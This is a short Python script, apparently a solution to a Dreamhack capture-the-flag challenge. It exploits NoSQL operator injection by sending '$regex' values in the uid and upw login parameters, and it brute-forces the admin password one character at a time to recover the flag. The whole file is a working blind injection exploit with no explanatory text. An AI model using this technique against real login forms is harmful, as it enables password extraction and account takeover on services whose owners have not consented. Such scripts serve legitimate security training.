import requests, string

HOST = "http://host3.dreamhack.games:10767"
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = "admin"

flag = ""
for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(
            f"{HOST}/login?uid[$regex]=admin&upw[$regex]={flag}{ch}"
        )
        print(response)
        if response.text == SUCCESS:
            flag += ch
            break
    print(f"FLAG: DH{{{flag}}}")
